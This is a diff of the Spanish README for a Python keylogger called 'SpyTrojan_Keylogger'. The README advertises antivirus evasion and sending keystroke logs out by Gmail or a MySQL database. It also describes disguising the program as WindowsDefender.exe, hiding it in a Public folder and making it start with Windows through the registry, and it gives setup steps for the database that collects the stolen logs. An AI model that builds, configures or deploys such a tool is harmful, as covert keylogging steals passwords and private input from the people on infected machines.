@@ -32,12 +32,12 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 ---
 # Caracteristicas
 - __Indetectable Antivirus:__ Windows Defender `24/05/2020`, Avast, ESET NOD32
-- __Envío por DB_MYSQL:__ Se enviarán los datos del registro mediante una base de datos MySQL, más información [Aquí]()
+- __Envío por DB_MYSQL:__ Se enviarán los datos del registro mediante una base de datos MySQL, más información [Aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#env%C3%ADo-mediante-base-de-datos-mysql)
 
     ![DataBase key](https://i.imgur.com/axhHVlF.png)
 
 
-- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`.
+- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`. más información [aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#envi%C3%B3-mediante-gmail).
 
   ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)
 
@@ -66,11 +66,10 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 - __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
     ![ExeCompilado](https://i.imgur.com/TlBEAaS.png)
 
-    ![StartUP Info](https://i.imgur.com/bkGSFQC.png)
-
     ![Info](https://i.imgur.com/MQAiVnJ.png) 
     ![Info](https://i.imgur.com/mTBByRy.png)
 
+    ![StartUP Info](https://i.imgur.com/bkGSFQC.png)
 - __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `reg.k`.
 
 - __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, [más información aquí.](https://github.com/SebastianEPH/SpyTrojan_Keylogger#m%C3%A9todo-de-infecci%C3%B3n)
@@ -182,7 +181,8 @@ def timeSend(): # Tiempo de envío perzonalizado
     ![](https://i.imgur.com/8mcP594.png)
 8. Creamos los siguientes datos con los siguiente typos de datos:
     ````c
-    l_id        // INT          [Llave Primaria]  (Autoincremento)
+    # No olvidar que el id debe ser autoincremento
+    l_id        // INT          [Llave Primaria]  [Autoincremento]
     l_user      // CHAR         [50 Caracteres] 
     l_time      // CHAR         [50 Caracteres]
     l_log       // MEDIUMTEXT   [Acepta 16.777.215 Caracteres]
@@ -216,7 +216,7 @@ def GMailOrDataBase():
                 # (en las proximas actualizaciones , ambas a la vez)
 
 def timeSend(): # Tiempo de envío perzonalizado
-    return 3 #Minutos                 <= Escoja su tiempo en minutos
+    return 10 #Minutos                 <= Escoja su tiempo en minutos
 ````
 
 11. Si al ejecutar el keylogger todo salió bien, podemos ver en la base de datos el registro de teclas
